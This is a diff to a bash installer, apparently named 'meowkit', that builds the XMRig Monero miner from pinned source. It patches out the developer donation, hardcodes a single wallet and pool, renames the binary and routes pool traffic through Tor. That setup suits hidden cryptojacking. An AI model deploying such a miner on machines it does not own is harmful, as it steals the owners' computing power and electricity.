@@ -2,6 +2,7 @@
 WALLET='47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG'
 POOL='gulf.moneroocean.stream:10001'
 XMRIG_VERSION='6.26.0'
+XMRIG_COMMIT='b2ca72480c58d197e18c885d9fc1a0c8d517e60a'
 
 worker_name() {
   install -d -m 750 "$MEOWKIT_DIR" || fail 'Cannot create settings directory.'
@@ -14,29 +15,59 @@ worker_name() {
 }
 
 install_xmrig() {
-  begin_step 'XMRig installation check'
+  begin_step 'XMRig source build'
   if [[ ${REPAIR:-0} == 1 && -x $MEOWKIT_BIN ]] && "$MEOWKIT_BIN" --version 2>&1 | grep -Fq "$XMRIG_VERSION"; then
     log "Existing XMRig $XMRIG_VERSION binary is valid; preserving it."
     return 0
   fi
-  begin_step 'XMRig download and verification'
+
   make_workdir
-  local asset="$WORKDIR/xmrig.tar.gz"
-  # Pin the official v6.26.0 static x64 asset and its SHA-256. Avoid the
-  # unauthenticated GitHub Releases API: shared Tor exit IPs can receive 403
-  # responses from api.github.com even while Tor connectivity is healthy.
-  # Update the version, URL, and digest together when changing XMRIG_VERSION.
-  local digest='fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5'
-  local url="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
-  [[ $XMRIG_VERSION == '6.26.0' ]] || fail 'The pinned XMRig checksum must be updated before changing XMRIG_VERSION.'
-  info 'Downloading XMRig through Tor; this can take a few minutes on a slow exit node.'
-  curl_tor --output "$asset" "$url" || fail 'Could not download the official XMRig release asset through Tor. The Tor exit node may be blocked; no direct-connection fallback was attempted.'
-  info 'XMRig download complete; verifying SHA-256.'
-  printf '%s  %s\n' "$digest" "$asset" | sha256sum --check --status || fail 'XMRig SHA-256 verification failed.'
-  tar -xzf "$asset" -C "$WORKDIR" || fail 'Could not unpack XMRig archive.'
-  local extracted="$WORKDIR/xmrig-${XMRIG_VERSION}/xmrig"
-  [[ -x $extracted ]] || fail 'Expected XMRig executable was not found in the release archive.'
-  install -m 0755 "$extracted" "$MEOWKIT_BIN"
+  local source="$WORKDIR/xmrig-src"
+  local build="$WORKDIR/xmrig-build"
+  local actual_commit
+  local build_jobs=${MEOWKIT_BUILD_JOBS:-2}
+  [[ $build_jobs =~ ^[1-9][0-9]*$ ]] || fail 'MEOWKIT_BUILD_JOBS must be a positive integer.'
+
+  # Pin the upstream source tag and commit. This checkout intentionally uses
+  # the normal network, not Tor: Tor is reserved for the miner's pool traffic.
+  [[ $XMRIG_VERSION == '6.26.0' ]] || fail 'Update the pinned XMRig commit before changing XMRIG_VERSION.'
+  require_cmd git
+  require_cmd cmake
+  info "Fetching XMRig source v$XMRIG_VERSION directly from GitHub (not through Tor)."
+  git clone --quiet --depth 1 --branch "v$XMRIG_VERSION" https://github.com/xmrig/xmrig.git "$source" ||
+    fail 'Could not fetch the pinned XMRig source from GitHub.'
+  actual_commit=$(git -C "$source" rev-parse HEAD) || fail 'Could not verify the XMRig source revision.'
+  [[ $actual_commit == "$XMRIG_COMMIT" ]] || fail "Unexpected XMRig source revision: $actual_commit"
+
+  # XMRig enforces a 1% minimum in its stock source. Patch both constants,
+  # then verify the exact source state before compiling.
+  sed -i \
+    -e 's/kDefaultDonateLevel = 1;/kDefaultDonateLevel = 0;/' \
+    -e 's/kMinimumDonateLevel = 1;/kMinimumDonateLevel = 0;/' \
+    "$source/src/donate.h"
+  grep -Fq 'kDefaultDonateLevel = 0;' "$source/src/donate.h" ||
+    fail 'Could not set XMRig default donation to 0%.'
+  grep -Fq 'kMinimumDonateLevel = 0;' "$source/src/donate.h" ||
+    fail 'Could not set XMRig minimum donation to 0%.'
+
+  info "Compiling XMRig with $build_jobs build job(s); this may take a few minutes."
+  cmake -S "$source" -B "$build" \
+    -DCMAKE_BUILD_TYPE=Release \
+    -DWITH_HWLOC=ON \
+    -DWITH_TLS=OFF \
+    -DWITH_OPENCL=OFF \
+    -DWITH_CUDA=OFF \
+    -DWITH_MSR=ON \
+    -DWITH_ASM=ON ||
+    fail 'XMRig CMake configuration failed. Check that the compiler and development packages installed correctly.'
+  cmake --build "$build" --parallel "$build_jobs" ||
+    fail 'XMRig source compilation failed.'
+  [[ -x $build/xmrig ]] || fail 'The XMRig build completed without producing the expected executable.'
+  "$build/xmrig" --version 2>&1 | grep -Fq "$XMRIG_VERSION" ||
+    fail 'The compiled XMRig binary did not report the pinned version.'
+  install -m 0755 "$build/xmrig" "$MEOWKIT_BIN" ||
+    fail 'Could not install the compiled XMRig binary.'
+  info "Installed source-built XMRig $XMRIG_VERSION with developer donation disabled (0%)."
 }
 
 write_tor_check() {
@@ -85,7 +116,7 @@ write_configuration() {
   local tmp="$MEOWKIT_DIR/config.json.tmp.$$"
   cat > "$tmp" <<EOFJSON
 {
-  "autosave": false,
+  "donate-level": 0,\n  "donate-over-proxy": 0,\n  "autosave": false,
   "background": false,
   "colors": false,
   "title": false,
